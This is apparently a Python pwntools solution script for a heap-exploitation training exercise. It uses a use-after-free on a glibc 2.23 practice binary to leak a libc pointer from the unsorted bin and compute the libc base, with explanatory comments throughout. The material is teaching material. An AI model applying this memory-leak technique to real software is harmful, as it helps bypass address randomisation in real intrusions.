#!/usr/bin/env python3
'''
Uninitialized memory challenge. Get the previous users
secret out of memory in order to solve the challenge.
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.uaf_read-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug(elf.path, env=env, gdbscript='''
dir ../../../libc_versions/2.23/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a secret 

'''
def create_secret():
	p.sendlineafter(">", "1") 

'''
View A secret

Parameter:
	- index: The index of the secret to print
Returns: 
	- The output from the print
'''
def view_secret(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your secret:") # Right before secret output

	# Outputted data
	output = p.recvuntil(b"Welcome").replace(b"Welcome",b"") 
	return output

'''
Delete a secret 

Parameter: 
	- index: The index of the secret to remove
'''	
def delete_secret(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Set a secret
Parameters: 
	- index: The index of the secret to set
	- secret: The text to be put into the secret
'''
def set_secret(index, secret):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", secret)
	return 

'''
Solve the exercise
Parameters: 
	- value: The secret value guess
'''
def check_value(value):
	p.sendlineafter(">", "5") 
	p.sendlineafter("Value:", hex(value))


'''
The struct stores the secret. The actual value is stored in `secret->value`. 
The struct is shown below: 

```
	// The secret struct
	struct secret {
		char value[secrets_size];
	};
```
'''

def libc_leak():

	print("Creating use after free on index 0")
	'''
	Two secrets must be created then the first one freed. This is because 
	these chunks are in the unsorted bin. Chunks in the unsorted bin will 
	be consolidated with the top chunk if they are next to it. 

	So, we put the chunk at index 1 as a filler and the chunk at index 0 
	as the actual chunk for the UAF victim. 
	'''
	# Create two secrets 
	create_secret() # Index 0
	create_secret() # Index 1

	# Create the use after free on index 0
	delete_secret(0)

	'''
	Index 0 chunk now has a UAF on it. Since this is GLibC 2.23, this goes
	into the unsorted bin. 

	Because this is the only chunk in the unsorted bin, both the 'fd' & 'bk' 
	point to LibC. 
	'''

	print("Using use after free to read LibC address")
	secret_value = view_secret(0).replace(b"\n",b"") # Get the string!
	print(secret_value)

	'''
	The address of LibC is in both the 'fd' and 'bk' pointers for 
	being the only item in the unsorted bin. 

	The value coming out appears as a string but x86 uses *little endian* 
	for the storage of memory. As a result, everything is going to be backwards
	in the grouping of bytes. For instance, the string ABCDEFGH would be 
	stored HGFEDCBA. 

	In order to get back the actual value we want into how our heads works
	(big endian) we need to parse the string out and reverse this. 
	The process for reversing can be done in our own function but pwntools
	has a super duper nice function for doing this: ``u64``. This does the
	reversing process for us and turns the value into an integer that we can
	handle. The function ``p64`` does this in the reverse. 
	'''
	# Trim the ending and add necessary nullbytes
	fd_pointer = secret_value[0:8].ljust(8, b"\x00")

	print(fd_pointer)
	fd_pointer = u64(fd_pointer)
	print("LibC Address Leak: ", hex(fd_pointer))

	offset = 0x39fb78 # LibC leak - base = offset
	print("LibC Address Offset: ", hex(offset))

	libc_base = fd_pointer - offset
	print("LibC Base", hex(libc_base))

	# Send the address as the solution.
	print("Send LibC address") 
	check_value(libc_base) 

libc_leak()

p.interactive()


